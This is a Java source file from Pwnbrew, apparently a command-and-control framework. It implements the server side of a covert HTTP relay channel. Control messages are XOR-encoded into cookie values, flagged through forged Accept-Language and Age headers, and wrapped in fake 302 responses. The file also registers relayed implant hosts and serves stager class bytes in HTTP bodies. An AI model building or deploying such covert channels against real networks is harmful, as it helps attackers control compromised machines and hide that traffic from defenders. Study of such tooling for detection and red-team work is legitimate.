/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  ServerHttpWrapper.java
 *
 *  Created on July 8, 2013
 */
package pwnbrew.network.http;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;
import pwnbrew.ClientConfig;
import pwnbrew.log.LoggableException;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.ConnectionManager;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.Message;
import pwnbrew.network.PortRouter;
import pwnbrew.network.RegisterMessage;
import pwnbrew.network.ServerPortRouter;
import pwnbrew.network.relay.RelayManager;
import pwnbrew.selector.SocketChannelCallback;
import pwnbrew.selector.SocketChannelHandler;
import pwnbrew.utilities.ReconnectTimer;
import pwnbrew.utilities.SocketUtilities;
import pwnbrew.utilities.Utilities;

/**
 *
 *  
 */
public class ServerHttpWrapper extends HttpWrapper {

    private static final String NAME_Class = ServerHttpWrapper.class.getSimpleName();
    private static final int STEALTH_COOKIE_B64 = 5;   
    
    //Random number gen for age
    private final SecureRandom aSR = new SecureRandom();  
    private volatile boolean staging = false;
       
//    private int lockVal = 0;
    //==========================================================================
    /**
     * Constructor
     *
    */
    public ServerHttpWrapper(){
    
    };
    
    //===============================================================
    /**
     *  Process the HTTP header, extract the data from it, and pass the message
     * on to the message handler.
     * 
     * @param aLine 
     */
    @Override
    void processHeader( SocketChannelHandler passedHandler ) {
    
        if( currentHeader != null ){
            
              //Get the accept language 
            String langField = currentHeader.getOption( Http.ACCEPT_LANGUAGE );
            if( langField != null ){

                //Split on the semi-colon separater
                String[] langArr = langField.split(";");
                if( langArr.length > 1){
                    
                    //Get the q field
                    String[] qArr = langArr[1].split("\\.");
                    if( qArr.length > 1){
                        
                        //Try an parse the field
                        try {
                            
                            int stealthNum = Integer.parseInt( qArr[1] );
                            byte[] ctrlMsg = getMessageBytes( stealthNum);
                                                       
                            //Create a control message
                            if( ctrlMsg != null ){

                                //Handle the message
                                ByteBuffer msgBB = ByteBuffer.wrap(ctrlMsg);
                                byte currMsgType = msgBB.get();
                                if( DataManager.isValidType( currMsgType ) ){
                                    
                                    //Get the length
                                    byte[] msgLenArr = new byte[Message.MSG_LEN_SIZE];
                                    msgBB.get(msgLenArr);
                                    
                                    //Verify that it matches
                                    int msgLen = SocketUtilities.byteArrayToInt(msgLenArr);
                                    if( msgLen == msgBB.remaining()){
                                        byte[] msgByteArr = new byte[msgLen];
                                        msgBB.get(msgByteArr);
                                        
                                        //Get the id If the client is already registered then return
                                        if( msgByteArr.length > 3 ){
                                            
                                            //Get dest id
                                            byte[] dstHostId = Arrays.copyOfRange(msgByteArr, 4, 8);
                                            int dstId = SocketUtilities.byteArrayToInt(dstHostId);
                                            
                                            if( currMsgType == Message.REGISTER_MESSAGE_TYPE ){
                                            
                                                RegisterMessage aMsg = RegisterMessage.getMessage( ByteBuffer.wrap( msgByteArr ));                                                
                                                int srcHostId = aMsg.getSrcHostId();
                                                int chanId = aMsg.getChannelId();
//                                                int destId = aMsg.getDestHostId();
                                         
                                                if( aMsg.getFunction() == RegisterMessage.REG ){
                                                    //Register the relay
                                                    ServerPortRouter aSPR = (ServerPortRouter)passedHandler.getPortRouter();
                                                    if( aSPR.registerHandler(srcHostId, chanId, passedHandler) ){
//                                                        RegisterMessage retMsg = new RegisterMessage(RegisterMessage.REG_ACK, chanId);
//                                                        retMsg.setDestHostId(srcHostId);
//                                                        
//                                                        DataManager.send( aSPR.getPortManager(), retMsg);
//                                                        passedHandler.setWrapping( false);
                                                
                                                                                                        
                                                        //Send to the server
                                                        aMsg.setDestHostId(-1);
                                                         
                                                        //Try the default port router
                                                        ClientConfig theConf = ClientConfig.getConfig();
                                                        int theSocketPort = theConf.getSocketPort();
                                                        String serverIp = theConf.getServerIp();
                                                        PortRouter thePR = aSPR.getPortManager().getPortRouter( theSocketPort );
                                                        
                                                        //Get the connection manager for the server
                                                        ConnectionManager aCM = thePR.getConnectionManager(-1);
                                                        if( aCM != null ){
                                                            
                                                            //Create a new channel if not comms
                                                            int srcChannelId = aMsg.getChannelId();
                                                            if( srcChannelId != ConnectionManager.COMM_CHANNEL_ID ){
                                                                
                                                                //Send back the ack
                                                                RegisterMessage retMsg = new RegisterMessage(RegisterMessage.REG_ACK, aMsg.getStlth(), chanId);
                                                                retMsg.setDestHostId(srcHostId);
                                                                
                                                                RelayManager aRelayManager = RelayManager.getRelayManager();
                                                                if( aRelayManager != null ){
                                                                    ServerPortRouter srvPR = aRelayManager.getServerPortRouter();
                                                                    //Try to send back
                                                                    DataManager.send(srvPR.getPortManager(), retMsg);
                                                                }
                                                                
                                                                
                                                                //Try to send back
                                                                DataManager.send(aSPR.getPortManager(), retMsg);
                                                                
                                                                //Turn off wrapping if not stlth
                                                                if( !aMsg.keepWrapping() )
                                                                    passedHandler.setWrapping( false);
////                                                                
                                                                if( aCM instanceof OutgoingConnectionManager ){
                                                                    
                                                                    //Create the Timer
                                                                    OutgoingConnectionManager theOCM = (OutgoingConnectionManager)aCM;
                                                                    int newChannelId = theOCM.getNextChannelId();
                                                                    ReconnectTimer aReconnectTimer = new ReconnectTimer(aSPR.getPortManager(), newChannelId); 
                                                                    byte stlth_val = 0;
                                                                    if( theConf.useStealth() )
                                                                        stlth_val = 1;   

                                                                    //Queue register message
                                                                    RegisterMessage regMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, newChannelId);
                                                                    aReconnectTimer.setPostConnectMessage(regMsg);
                                 
                                                                    
                                                                    //Create callback
                                                                    SocketChannelCallback aSCC = new SocketChannelCallback(serverIp, theSocketPort, aMsg, aCM, aReconnectTimer);
                                                      
                                                                    //TODO need to check if the id is already taken
                                                                    //ClientPortRouter aCPR = (ClientPortRouter)thePR;
                                                                    //aCPR.ensureConnectivity(aSCC, chanId);
                                                                    aReconnectTimer.setConnectionCallback(aSCC);
                                                                    aReconnectTimer.start();
                                                                    
                                                                }
                                                            } else {
                                                            
                                                                SocketChannelHandler srvHandler = aCM.getSocketChannelHandler( srcChannelId );
                                                                if( srvHandler != null ){
                                                                    byte[] regBytes = aMsg.getBytes();
                                                                    srvHandler.queueBytes(regBytes, aMsg.getCancelId());
                                                                }
                                                                
                                                            }
                                                        }
                                                    }
                                                                                                            
                                                    //Send back reg ack
                                                }
                                  
                                                
                                            } else {
                                                
                                                if( currMsgType == Message.STAGING_MESSAGE_TYPE ){

                                                    //Get src id
                                                    byte[] srcHostIdArr = Arrays.copyOfRange(msgByteArr, 0, 4);
                                                    int srcHostId = SocketUtilities.byteArrayToInt(srcHostIdArr);

                                                    //Register the relay
                                                    ServerPortRouter aSPR = (ServerPortRouter)passedHandler.getPortRouter();
                                                    if( !aSPR.registerHandler(srcHostId, ConnectionManager.STAGE_CHANNEL_ID, passedHandler) )
                                                        return;
                                                                                          
                                                }
                                                
                                                
                                                DataManager.routeMessage( passedHandler.getPortRouter(), currMsgType, dstId, msgByteArr );
                                            }
                                        }
                                        
                                    } else {
                                        RemoteLog.log( Level.WARNING, NAME_Class, "processHeader()", "Message size doesn't match remaing size.", null);
                                    }
                                }
                            }
                            
                        } catch ( NumberFormatException ex){
                            
                            //Do nothing because it doesn't fit the criteria
                            ex = null;
                        } catch (IOException ex) {
                            
                            //Do nothing because it doesn't fit the criteria
                            ex = null;
                        } catch (LoggableException ex) {
                            
                            RemoteLog.log(Level.SEVERE, NAME_Class, "processHeader()", ex.getMessage(), ex );   
                        }
                    }
                }
            }  
                                    
        }
    }
    
    //===============================================================
    /**
     *  Returns a ByteBuffer with the necessary bytes in it.
     * 
     * @param msgBytes
     * @return 
    */
    @Override
    public ByteBuffer wrapBytes( byte[] msgBytes ) {
         
        if( staging )
            return wrapStager( msgBytes );
        else {
            //Allocate and add the bytes from the message
           Http aHttpMsg = Http.getGeneric( Http._302 );

           //XOR the bytes
           if( msgBytes.length > 0 ){     

               //Have to add 1 because this call is between 0 and n which means the check on the other
               //side will fail if the number returns 0
               int exp = aSR.nextInt( 9 ) + 1;
               int ageVal = (int) Math.pow(STEALTH_COOKIE_B64, exp);

               //XOR the bytes
               byte[] encodedBytes = Utilities.xorData(msgBytes, XOR_STRING.getBytes());
               //Get a hex string representation
               String encodedByteStr = SocketUtilities.toString(encodedBytes).replace(" ", "");
               StringBuilder aSB = new StringBuilder()
                       .append(COOKIE_REF).append("=").append( encodedByteStr ); 

               aHttpMsg.setOption(Http.SET_COOKIE, aSB.toString());
               aHttpMsg.setOption(Http.AGE, Integer.toString(ageVal));

           }

           //Allocate enough space
           int httpLen = aHttpMsg.getLength();
           ByteBuffer aByteBuffer = ByteBuffer.allocate( httpLen );

           //Add the bytes
           aHttpMsg.append(aByteBuffer);

           return aByteBuffer;
        }
        
    }
    
      
    //======================================================================
    /**
     * 
     * @param classBytes
     * @return 
     */
    private ByteBuffer wrapStager( byte[] classBytes ){
       
         //Allocate and add the bytes from the message
        Http aHttpMsg = Http.getGeneric( Http._200 );
        
        //Set the bytes
        if( classBytes.length > 0 ){         
             
            aHttpMsg.setPayloadBytes( classBytes );                    
            aHttpMsg.setOption( Http.CONTENT_LENGTH, Integer.toString(classBytes.length) );
         
        }
        
        //Allocate enough space
        int httpLen = aHttpMsg.getLength();
        ByteBuffer aByteBuffer = ByteBuffer.allocate( httpLen );
        
        //Add the bytes
        aHttpMsg.append(aByteBuffer);
        return aByteBuffer;
    }
    
    //===============================================================
    /**
     *  Return the message bytes.
     * 
     * @param aLine 
     */
    private byte[] getMessageBytes(int stealthNum) throws IOException {
        
        byte[] msgBytes = null;
        switch( stealthNum ){
            case STEALTH_COOKIE_B64:
                //Get the cookie
                String cookieVal = currentHeader.getOption( Http.COOKIE );
                if( cookieVal != null && cookieVal.startsWith(COOKIE_REF) ){
                    String[] cookieArr = cookieVal.split("=");
                    if( cookieArr.length > 1 ){
                        //Convert the hexstring to bytes
                        String hexString = cookieArr[1];                        
                        byte[] xorBytes = SocketUtilities.hexStringToByteArray(hexString);
                        
                        //XOR the bytes
                        msgBytes = Utilities.xorData(xorBytes, XOR_STRING.getBytes());
          
                    }
                }
                break;
            default:
                break;
        }  
           
        return msgBytes;
    }       
     
    //===================================================================
    /**
     *  Set the staging flag
     * 
     * @param passedBool 
     */
    public synchronized void setStaging( boolean passedBool ) {
        staging = passedBool;
    }
    
    //===================================================================
    /**
     *  Check if the handler is managing a staged connection
     * 
     * @return 
     */
    public synchronized boolean isStaged() {
        return staging;
    }
    
}
